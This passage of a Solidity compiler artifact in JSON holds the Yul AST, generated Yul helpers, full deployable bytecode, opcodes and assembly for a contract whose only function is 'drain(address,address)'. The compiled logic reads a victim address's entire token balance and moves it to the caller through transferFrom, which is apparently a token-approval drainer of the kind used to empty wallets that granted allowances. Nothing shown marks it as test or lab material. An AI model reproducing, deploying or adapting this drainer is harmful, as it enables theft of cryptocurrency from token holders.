																	"src": "3410:3:2"
																},
																"nativeSrc": "3410:32:2",
																"nodeType": "YulFunctionCall",
																"src": "3410:32:2"
															},
															"nativeSrc": "3407:119:2",
															"nodeType": "YulIf",
															"src": "3407:119:2"
														},
														{
															"nativeSrc": "3536:125:2",
															"nodeType": "YulBlock",
															"src": "3536:125:2",
															"statements": [
																{
																	"nativeSrc": "3551:15:2",
																	"nodeType": "YulVariableDeclaration",
																	"src": "3551:15:2",
																	"value": {
																		"kind": "number",
																		"nativeSrc": "3565:1:2",
																		"nodeType": "YulLiteral",
																		"src": "3565:1:2",
																		"type": "",
																		"value": "0"
																	},
																	"variables": [
																		{
																			"name": "offset",
																			"nativeSrc": "3555:6:2",
																			"nodeType": "YulTypedName",
																			"src": "3555:6:2",
																			"type": ""
																		}
																	]
																},
																{
																	"nativeSrc": "3580:71:2",
																	"nodeType": "YulAssignment",
																	"src": "3580:71:2",
																	"value": {
																		"arguments": [
																			{
																				"arguments": [
																					{
																						"name": "headStart",
																						"nativeSrc": "3623:9:2",
																						"nodeType": "YulIdentifier",
																						"src": "3623:9:2"
																					},
																					{
																						"name": "offset",
																						"nativeSrc": "3634:6:2",
																						"nodeType": "YulIdentifier",
																						"src": "3634:6:2"
																					}
																				],
																				"functionName": {
																					"name": "add",
																					"nativeSrc": "3619:3:2",
																					"nodeType": "YulIdentifier",
																					"src": "3619:3:2"
																				},
																				"nativeSrc": "3619:22:2",
																				"nodeType": "YulFunctionCall",
																				"src": "3619:22:2"
																			},
																			{
																				"name": "dataEnd",
																				"nativeSrc": "3643:7:2",
																				"nodeType": "YulIdentifier",
																				"src": "3643:7:2"
																			}
																		],
																		"functionName": {
																			"name": "abi_decode_t_bool_fromMemory",
																			"nativeSrc": "3590:28:2",
																			"nodeType": "YulIdentifier",
																			"src": "3590:28:2"
																		},
																		"nativeSrc": "3590:61:2",
																		"nodeType": "YulFunctionCall",
																		"src": "3590:61:2"
																	},
																	"variableNames": [
																		{
																			"name": "value0",
																			"nativeSrc": "3580:6:2",
																			"nodeType": "YulIdentifier",
																			"src": "3580:6:2"
																		}
																	]
																}
															]
														}
													]
												},
												"name": "abi_decode_tuple_t_bool_fromMemory",
												"nativeSrc": "3323:345:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nativeSrc": "3367:9:2",
														"nodeType": "YulTypedName",
														"src": "3367:9:2",
														"type": ""
													},
													{
														"name": "dataEnd",
														"nativeSrc": "3378:7:2",
														"nodeType": "YulTypedName",
														"src": "3378:7:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value0",
														"nativeSrc": "3390:6:2",
														"nodeType": "YulTypedName",
														"src": "3390:6:2",
														"type": ""
													}
												],
												"src": "3323:345:2"
											}
										]
									},
									"contents": "{\n\n    function allocate_unbounded() -> memPtr {\n        memPtr := mload(64)\n    }\n\n    function revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() {\n        revert(0, 0)\n    }\n\n    function revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db() {\n        revert(0, 0)\n    }\n\n    function cleanup_t_uint160(value) -> cleaned {\n        cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff)\n    }\n\n    function cleanup_t_address(value) -> cleaned {\n        cleaned := cleanup_t_uint160(value)\n    }\n\n    function validator_revert_t_address(value) {\n        if iszero(eq(value, cleanup_t_address(value))) { revert(0, 0) }\n    }\n\n    function abi_decode_t_address(offset, end) -> value {\n        value := calldataload(offset)\n        validator_revert_t_address(value)\n    }\n\n    function abi_decode_tuple_t_addresst_address(headStart, dataEnd) -> value0, value1 {\n        if slt(sub(dataEnd, headStart), 64) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_address(add(headStart, offset), dataEnd)\n        }\n\n        {\n\n            let offset := 32\n\n            value1 := abi_decode_t_address(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n    function abi_encode_t_address_to_t_address_fromStack(value, pos) {\n        mstore(pos, cleanup_t_address(value))\n    }\n\n    function abi_encode_tuple_t_address__to_t_address__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_address_to_t_address_fromStack(value0,  add(headStart, 0))\n\n    }\n\n    function cleanup_t_uint256(value) -> cleaned {\n        cleaned := value\n    }\n\n    function validator_revert_t_uint256(value) {\n        if iszero(eq(value, cleanup_t_uint256(value))) { revert(0, 0) }\n    }\n\n    function abi_decode_t_uint256_fromMemory(offset, end) -> value {\n        value := mload(offset)\n        validator_revert_t_uint256(value)\n    }\n\n    function abi_decode_tuple_t_uint256_fromMemory(headStart, dataEnd) -> value0 {\n        if slt(sub(dataEnd, headStart), 32) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_uint256_fromMemory(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n    function abi_encode_t_uint256_to_t_uint256_fromStack(value, pos) {\n        mstore(pos, cleanup_t_uint256(value))\n    }\n\n    function abi_encode_tuple_t_address_t_address_t_uint256__to_t_address_t_address_t_uint256__fromStack_reversed(headStart , value2, value1, value0) -> tail {\n        tail := add(headStart, 96)\n\n        abi_encode_t_address_to_t_address_fromStack(value0,  add(headStart, 0))\n\n        abi_encode_t_address_to_t_address_fromStack(value1,  add(headStart, 32))\n\n        abi_encode_t_uint256_to_t_uint256_fromStack(value2,  add(headStart, 64))\n\n    }\n\n    function cleanup_t_bool(value) -> cleaned {\n        cleaned := iszero(iszero(value))\n    }\n\n    function validator_revert_t_bool(value) {\n        if iszero(eq(value, cleanup_t_bool(value))) { revert(0, 0) }\n    }\n\n    function abi_decode_t_bool_fromMemory(offset, end) -> value {\n        value := mload(offset)\n        validator_revert_t_bool(value)\n    }\n\n    function abi_decode_tuple_t_bool_fromMemory(headStart, dataEnd) -> value0 {\n        if slt(sub(dataEnd, headStart), 32) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_bool_fromMemory(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n}\n",
									"id": 2,
									"language": "Yul",
									"name": "#utility.yul"
								}
							],
							"immutableReferences": {},
							"linkReferences": {},
							"object": "608060405234801561000f575f5ffd5b5060043610610029575f3560e01c8063837971e41461002d575b5f5ffd5b610047600480360381019061004291906101a0565b610049565b005b8173ffffffffffffffffffffffffffffffffffffffff166323b872dd82338573ffffffffffffffffffffffffffffffffffffffff166370a08231866040518263ffffffff1660e01b81526004016100a091906101ed565b602060405180830381865afa1580156100bb573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906100df9190610239565b6040518463ffffffff1660e01b81526004016100fd93929190610273565b6020604051808303815f875af1158015610119573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061013d91906102dd565b505050565b5f5ffd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f61016f82610146565b9050919050565b61017f81610165565b8114610189575f5ffd5b50565b5f8135905061019a81610176565b92915050565b5f5f604083850312156101b6576101b5610142565b5b5f6101c38582860161018c565b92505060206101d48582860161018c565b9150509250929050565b6101e781610165565b82525050565b5f6020820190506102005f8301846101de565b92915050565b5f819050919050565b61021881610206565b8114610222575f5ffd5b50565b5f815190506102338161020f565b92915050565b5f6020828403121561024e5761024d610142565b5b5f61025b84828501610225565b91505092915050565b61026d81610206565b82525050565b5f6060820190506102865f8301866101de565b61029360208301856101de565b6102a06040830184610264565b949350505050565b5f8115159050919050565b6102bc816102a8565b81146102c6575f5ffd5b50565b5f815190506102d7816102b3565b92915050565b5f602082840312156102f2576102f1610142565b5b5f6102ff848285016102c9565b9150509291505056fea2646970667358221220e9163db613faa4160efe8d9e09a63dd2a57f7be0f83c0460c8e05a206c0c7d7f64736f6c634300081d0033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x29 JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x837971E4 EQ PUSH2 0x2D JUMPI JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH2 0x47 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x42 SWAP2 SWAP1 PUSH2 0x1A0 JUMP JUMPDEST PUSH2 0x49 JUMP JUMPDEST STOP JUMPDEST DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x23B872DD DUP3 CALLER DUP6 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x70A08231 DUP7 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0xA0 SWAP2 SWAP1 PUSH2 0x1ED JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0xBB JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0xDF SWAP2 SWAP1 PUSH2 0x239 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP5 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0xFD SWAP4 SWAP3 SWAP2 SWAP1 PUSH2 0x273 JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0x119 JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x13D SWAP2 SWAP1 PUSH2 0x2DD JUMP JUMPDEST POP POP POP JUMP JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x16F DUP3 PUSH2 0x146 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x17F DUP2 PUSH2 0x165 JUMP JUMPDEST DUP2 EQ PUSH2 0x189 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x19A DUP2 PUSH2 0x176 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH0 PUSH1 0x40 DUP4 DUP6 SUB SLT ISZERO PUSH2 0x1B6 JUMPI PUSH2 0x1B5 PUSH2 0x142 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x1C3 DUP6 DUP3 DUP7 ADD PUSH2 0x18C JUMP JUMPDEST SWAP3 POP POP PUSH1 0x20 PUSH2 0x1D4 DUP6 DUP3 DUP7 ADD PUSH2 0x18C JUMP JUMPDEST SWAP2 POP POP SWAP3 POP SWAP3 SWAP1 POP JUMP JUMPDEST PUSH2 0x1E7 DUP2 PUSH2 0x165 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x200 PUSH0 DUP4 ADD DUP5 PUSH2 0x1DE JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x218 DUP2 PUSH2 0x206 JUMP JUMPDEST DUP2 EQ PUSH2 0x222 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0x233 DUP2 PUSH2 0x20F JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x24E JUMPI PUSH2 0x24D PUSH2 0x142 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x25B DUP5 DUP3 DUP6 ADD PUSH2 0x225 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x26D DUP2 PUSH2 0x206 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x60 DUP3 ADD SWAP1 POP PUSH2 0x286 PUSH0 DUP4 ADD DUP7 PUSH2 0x1DE JUMP JUMPDEST PUSH2 0x293 PUSH1 0x20 DUP4 ADD DUP6 PUSH2 0x1DE JUMP JUMPDEST PUSH2 0x2A0 PUSH1 0x40 DUP4 ADD DUP5 PUSH2 0x264 JUMP JUMPDEST SWAP5 SWAP4 POP POP POP POP JUMP JUMPDEST PUSH0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x2BC DUP2 PUSH2 0x2A8 JUMP JUMPDEST DUP2 EQ PUSH2 0x2C6 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0x2D7 DUP2 PUSH2 0x2B3 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x2F2 JUMPI PUSH2 0x2F1 PUSH2 0x142 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x2FF DUP5 DUP3 DUP6 ADD PUSH2 0x2C9 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xE9 AND RETURNDATASIZE 0xB6 SGT STATICCALL LOG4 AND 0xE INVALID DUP14 SWAP15 MULMOD 0xA6 RETURNDATASIZE 0xD2 0xA5 PUSH32 0x7BE0F83C0460C8E05A206C0C7D7F64736F6C634300081D003300000000000000 ",
							"sourceMap": "250:222:1:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;279:191;;;;;;;;;;;;;:::i;:::-;;:::i;:::-;;;349:5;342:26;;;382:4;400:10;431:5;424:23;;;448:4;424:29;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;342:121;;;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;279:191;;:::o;88:117:2:-;197:1;194;187:12;334:126;371:7;411:42;404:5;400:54;389:65;;334:126;;;:::o;466:96::-;503:7;532:24;550:5;532:24;:::i;:::-;521:35;;466:96;;;:::o;568:122::-;641:24;659:5;641:24;:::i;:::-;634:5;631:35;621:63;;680:1;677;670:12;621:63;568:122;:::o;696:139::-;742:5;780:6;767:20;758:29;;796:33;823:5;796:33;:::i;:::-;696:139;;;;:::o;841:474::-;909:6;917;966:2;954:9;945:7;941:23;937:32;934:119;;;972:79;;:::i;:::-;934:119;1092:1;1117:53;1162:7;1153:6;1142:9;1138:22;1117:53;:::i;:::-;1107:63;;1063:117;1219:2;1245:53;1290:7;1281:6;1270:9;1266:22;1245:53;:::i;:::-;1235:63;;1190:118;841:474;;;;;:::o;1321:118::-;1408:24;1426:5;1408:24;:::i;:::-;1403:3;1396:37;1321:118;;:::o;1445:222::-;1538:4;1576:2;1565:9;1561:18;1553:26;;1589:71;1657:1;1646:9;1642:17;1633:6;1589:71;:::i;:::-;1445:222;;;;:::o;1673:77::-;1710:7;1739:5;1728:16;;1673:77;;;:::o;1756:122::-;1829:24;1847:5;1829:24;:::i;:::-;1822:5;1819:35;1809:63;;1868:1;1865;1858:12;1809:63;1756:122;:::o;1884:143::-;1941:5;1972:6;1966:13;1957:22;;1988:33;2015:5;1988:33;:::i;:::-;1884:143;;;;:::o;2033:351::-;2103:6;2152:2;2140:9;2131:7;2127:23;2123:32;2120:119;;;2158:79;;:::i;:::-;2120:119;2278:1;2303:64;2359:7;2350:6;2339:9;2335:22;2303:64;:::i;:::-;2293:74;;2249:128;2033:351;;;;:::o;2390:118::-;2477:24;2495:5;2477:24;:::i;:::-;2472:3;2465:37;2390:118;;:::o;2514:442::-;2663:4;2701:2;2690:9;2686:18;2678:26;;2714:71;2782:1;2771:9;2767:17;2758:6;2714:71;:::i;:::-;2795:72;2863:2;2852:9;2848:18;2839:6;2795:72;:::i;:::-;2877;2945:2;2934:9;2930:18;2921:6;2877:72;:::i;:::-;2514:442;;;;;;:::o;2962:90::-;2996:7;3039:5;3032:13;3025:21;3014:32;;2962:90;;;:::o;3058:116::-;3128:21;3143:5;3128:21;:::i;:::-;3121:5;3118:32;3108:60;;3164:1;3161;3154:12;3108:60;3058:116;:::o;3180:137::-;3234:5;3265:6;3259:13;3250:22;;3281:30;3305:5;3281:30;:::i;:::-;3180:137;;;;:::o;3323:345::-;3390:6;3439:2;3427:9;3418:7;3414:23;3410:32;3407:119;;;3445:79;;:::i;:::-;3407:119;3565:1;3590:61;3643:7;3634:6;3623:9;3619:22;3590:61;:::i;:::-;3580:71;;3536:125;3323:345;;;;:::o"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "166000",
								"executionCost": "206",
								"totalCost": "166206"
							},
							"external": {
								"drain(address,address)": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 250,
									"end": 472,
									"name": "PUSH",
									"source": 1,
									"value": "80"
								},
								{
									"begin": 250,
									"end": 472,
									"name": "PUSH",
									"source": 1,
									"value": "40"
								},
								{
									"begin": 250,
									"end": 472,
									"name": "MSTORE",
									"source": 1
								},
								{
									"begin": 250,
									"end": 472,
									"name": "CALLVALUE",
									"source": 1
								},
								{
									"begin": 250,
									"end": 472,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 250,
									"end": 472,
									"name": "ISZERO",
									"source": 1
								},
								{
									"begin": 250,
									"end": 472,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "1"
								},
								{
									"begin": 250,
									"end": 472,
									"name": "JUMPI",
									"source": 1
								},
								{
									"begin": 250,
									"end": 472,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 250,
									"end": 472,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 250,
									"end": 472,
									"name": "REVERT",
									"source": 1
								},
								{
									"begin": 250,
									"end": 472,
									"name": "tag",
									"source": 1,
									"value": "1"
								},
								{
									"begin": 250,
									"end": 472,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 250,
									"end": 472,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 250,
									"end": 472,
									"name": "PUSH #[$]",
									"source": 1,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 250,
									"end": 472,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 250,
									"end": 472,
									"name": "PUSH [$]",
									"source": 1,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 250,
									"end": 472,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 250,
									"end": 472,
									"name": "CODECOPY",
									"source": 1
								},
								{
									"begin": 250,
									"end": 472,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 250,
									"end": 472,
									"name": "RETURN",
									"source": 1
								}
							],
							".data": {
								"0": {
									".auxdata": "a2646970667358221220e9163db613faa4160efe8d9e09a63dd2a57f7be0f83c0460c8e05a206c0c7d7f64736f6c634300081d0033",
									".code": [
										{
											"begin": 250,
											"end": 472,
											"name": "PUSH",
											"source": 1,
											"value": "80"
										},
										{
											"begin": 250,
											"end": 472,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 250,
											"end": 472,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 250,
											"end": 472,
											"name": "CALLVALUE",
											"source": 1
										},
										{
											"begin": 250,
											"end": 472,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 250,
											"end": 472,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 250,
											"end": 472,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "1"
										},
										{
											"begin": 250,
											"end": 472,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 250,
											"end": 472,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 250,
											"end": 472,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 250,
											"end": 472,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 250,
											"end": 472,
											"name": "tag",
											"source": 1,
											"value": "1"
										},
										{
											"begin": 250,
											"end": 472,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 250,
											"end": 472,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 250,
											"end": 472,
											"name": "PUSH",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 250,
											"end": 472,
											"name": "CALLDATASIZE",
											"source": 1
										},
										{
											"begin": 250,
											"end": 472,
											"name": "LT",
											"source": 1
										},
										{
											"begin": 250,
											"end": 472,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "2"
										},
										{
											"begin": 250,
											"end": 472,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 250,
											"end": 472,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 250,
											"end": 472,
											"name": "CALLDATALOAD",
											"source": 1
										},
										{
											"begin": 250,
											"end": 472,
											"name": "PUSH",
											"source": 1,
											"value": "E0"
										},
										{
											"begin": 250,
											"end": 472,
											"name": "SHR",
											"source": 1
										},
										{
											"begin": 250,
											"end": 472,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 250,
											"end": 472,
											"name": "PUSH",
											"source": 1,
											"value": "837971E4"
										},
										{
											"begin": 250,
											"end": 472,
											"name": "EQ",
											"source": 1
										},
										{
											"begin": 250,
											"end": 472,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "3"
										},
										{
											"begin": 250,
											"end": 472,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 250,
											"end": 472,
											"name": "tag",
											"source": 1,
											"value": "2"
										},
										{
											"begin": 250,
											"end": 472,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 250,
											"end": 472,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 250,
											"end": 472,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 250,
											"end": 472,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 279,
											"end": 470,
											"name": "tag",
											"source": 1,
											"value": "3"
										},
										{
											"begin": 279,
											"end": 470,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 279,
											"end": 470,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 279,
											"end": 470,
											"name": "PUSH",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 279,
											"end": 470,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 279,
											"end": 470,
											"name": "CALLDATASIZE",
											"source": 1
										},
										{
											"begin": 279,
											"end": 470,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 279,
											"end": 470,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 279,
											"end": 470,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 279,
											"end": 470,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 279,
											"end": 470,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "5"
										},
										{
											"begin": 279,
											"end": 470,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 279,
											"end": 470,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 279,
											"end": 470,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "6"
										},
										{
											"begin": 279,
											"end": 470,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 279,
											"end": 470,
											"name": "tag",
											"source": 1,
											"value": "5"
										},
										{
											"begin": 279,
											"end": 470,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 279,
											"end": 470,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "7"
										},
										{
											"begin": 279,
											"end": 470,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 279,
											"end": 470,
											"name": "tag",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 279,
											"end": 470,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 279,
											"end": 470,
											"name": "STOP",
											"source": 1
										},
										{
											"begin": 279,
											"end": 470,
											"name": "tag",
											"source": 1,
											"value": "7"
										},
										{
											"begin": 279,
											"end": 470,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 349,
											"end": 354,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 342,
											"end": 368,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 342,
											"end": 368,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 342,
											"end": 368,
											"name": "PUSH",
											"source": 1,
											"value": "23B872DD"
										},
										{
											"begin": 382,
											"end": 386,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 400,
											"end": 410,
											"name": "CALLER",
											"source": 1
										},
										{
											"begin": 431,
											"end": 436,
											"name": "DUP6",
											"source": 1
										},
										{
											"begin": 424,
											"end": 447,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 424,
											"end": 447,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 424,
											"end": 447,
											"name": "PUSH",
											"source": 1,
											"value": "70A08231"
										},
										{
											"begin": 448,
											"end": 452,
											"name": "DUP7",
											"source": 1
										},
										{
											"begin": 424,
											"end": 453,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 424,
											"end": 453,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 424,
											"end": 453,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 424,
											"end": 453,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFF"
										},
										{
											"begin": 424,
											"end": 453,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 424,
											"end": 453,
											"name": "PUSH",
											"source": 1,
											"value": "E0"
										},
										{
											"begin": 424,
											"end": 453,
											"name": "SHL",
											"source": 1
										},
										{
											"begin": 424,
											"end": 453,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 424,
											"end": 453,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 424,
											"end": 453,
											"name": "PUSH",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 424,
											"end": 453,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 424,
											"end": 453,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "9"
										},
										{
											"begin": 424,
											"end": 453,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 424,
											"end": 453,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 424,
											"end": 453,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "10"
										},
										{
											"begin": 424,
											"end": 453,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 424,
											"end": 453,
											"name": "tag",
											"source": 1,
											"value": "9"
										},
										{
											"begin": 424,
											"end": 453,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 424,
											"end": 453,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 424,
											"end": 453,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 424,
											"end": 453,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 424,
											"end": 453,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 424,
											"end": 453,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 424,
											"end": 453,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 424,
											"end": 453,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 424,
											"end": 453,
											"name": "DUP7",
											"source": 1
										},
										{
											"begin": 424,
											"end": 453,
											"name": "GAS",
											"source": 1
										},
										{
											"begin": 424,
											"end": 453,
											"name": "STATICCALL",
											"source": 1
										},
										{
											"begin": 424,
											"end": 453,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 424,
											"end": 453,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 424,
											"end": 453,
											"name": "ISZERO",
											"source": 1
